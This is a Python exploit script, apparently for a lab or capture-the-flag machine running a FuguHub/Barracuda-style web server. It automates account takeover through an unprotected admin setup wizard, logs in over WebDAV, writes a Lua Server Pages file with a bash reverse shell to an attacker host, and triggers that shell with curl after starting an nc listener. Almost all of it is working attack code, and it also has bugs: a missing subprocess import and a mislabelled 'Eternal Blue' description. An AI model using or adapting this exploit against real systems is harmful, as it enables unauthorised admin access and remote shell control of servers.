#!/usr/bin/python3

import os
import argparse
import sys
import time
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import importlib.util


#install libaries if not installed
print("Installing necessary tools if not already installed")
package_name = 'colorama'
spec = importlib.util.find_spec(package_name)
if spec is None:
	print(package_name +" is not installed, installing now")
	subprocess.check_call([sys.executable, '-m', 'pip3', 'install', package_name])
else:
	print("Colorama installed, not installing")
package_name = 'selenium'
spec = importlib.util.find_spec(package_name)
if spec is None:
	print(package_name +" is not installed, installing now")
	subprocess.check_call([sys.executable, '-m', 'pip3', 'install', package_name])
else:
	print("Selenium installed, not installing")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

print(f"{RED} _____ _____  _____    ______ _   _ _____ _   _ _   _ _   _______ ")
print(f"{YELLOW}|  _  |  __ \/  __ \   |  ___| | | |  __ \ | | | | | | | | | ___ \\")
print(f"{GREEN}| | | | |  \/| /  \/   | |_  | | | | |  \/ | | | |_| | | | | |_/ /")
print(f"{BLUE}| | | | | __ | |       |  _| | | | | | __| | | |  _  | | | | ___ \\")
print(f"{MAGENTA}\ \_/ / |_\ \| \__/\   | |   | |_| | |_\ \ |_| | | | | |_| | |_/ /")
print(f"{CYAN} \___/ \____/ \____/   \_|    \___/ \____/\___/\_| |_/\___/\____/ ")
                                                                                                                                                                                                                               
parser = argparse.ArgumentParser(description="Eternal Blue",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="Eternal Blue", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-p", "--LPORT", action="store", help="LPORT")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
parser.add_argument("-r", "--RHOST", action="store", help="RHOST IP")
parser.add_argument("-P", "--RPORT", action="store", help="URL Port (ex 8082)")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

LPORT = args.LPORT
LHOST = args.LHOST
URL = args.RHOST
RPORT=args.RPORT

#if user already exists comment out the below lines in box 

#######################################################################

print(f"{YELLOW}Trying to set the following parameters{RESET}")
print(f"{YELLOW}Email {BLUE}adm1n@localhost.local {YELLOW}, username {BLUE}adm1n{YELLOW} password{BLUE} P@ssw0rd! {RESET}")

driver = webdriver.Firefox()
ext = "/Config-Wizard/wizard/SetAdmin.lsp"
URL1 = f"http://{URL}:{RPORT}{ext}"
print(f"{MAGENTA}Creating admin user on {URL1}{RESET} \n")
driver.get(URL1)
element = driver.find_element(By.NAME, 'email')
element.send_keys("adm1n@localhost.local")
element = driver.find_element(By.NAME, 'user')
element.send_keys("adm1n")
element = driver.find_element(By.NAME, 'password')
element.send_keys("P@ssw0rd!")
element = driver.find_element(By.ID, 'password2')
element.send_keys("P@ssw0rd!")
element.submit()
print(f"{RED}Logging in to WebFileServer to retrieve cadaver information{RESET} \n")
ext = "/rtl/protected/wfslinks.lsp"
URL1 = f"http://{URL}:{RPORT}{ext}"
print(f"{MAGENTA}Logging in at {URL1}{RESET}")
driver.get(URL1)
element = driver.find_element(By.ID, 'name')
element.send_keys("adm1n")
element = driver.find_element(By.ID, 'ba_password2')
element.send_keys("P@ssw0rd!")
clickable = driver.find_element(By.ID, "ba_loginbut")
clickable.click()
#MAY NEED TO CHANGE EXTENSION IF NOT /fs/
ext = "/fs/"
URL1 = f"http://{URL}:{RPORT}{ext}"
driver.get(URL1)
time.sleep(2)
clickable = driver.find_element(By.ID, "WebDAVB")
clickable.click()

#######################################################################

print(f"{YELLOW}Making lua.lsp script with bash reverse shell going to {RED}{LHOST}{YELLOW} on port {RED}{LPORT}{RESET}\n")

with open ("lua.lsp", "w") as f:
	f.write(f"<div sytle=\"margin-leftLauto;margin-right: auth;width: 350px;\">\n \
<div id=\"info\">\n \
<h2>Lua Server Pages Reverse Shell</h2>\n \
<p>haha</p>\n \
</div>\n \
\
<?lsp if request:method() == \"GET\" then ?>\n \
	<?lsp os.execute(\"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'\")?>\n \
<?lsp else ?>\n \
	you sent a <?lsp=request:method() ?> request\n \
<?lsp end ?>\n \
\
</div>")
	print(f)

print(f"{BLUE}Copy the URL you see in the popup, this will be known below as <URL>{RESET}")	
print(f"{RED}Run the following commands{RESET}\n")
print(f"{MAGENTA}cadaver \n \
open <URL> \n \
cd .. \n \
adm1n \n \
P@ssw0rd! \n \
put lua.lsp \n {RESET}")

input(f"{YELLOW}Open new tab and start listener with {RED}nc -lvnp {LPORT}{YELLOW} press enter to continue{RESET}")
#os system running for DZE64
os.system(f"curl https://{URL}:9999/lua.lsp -k -u 'adm1n:P@ssw0rd!'")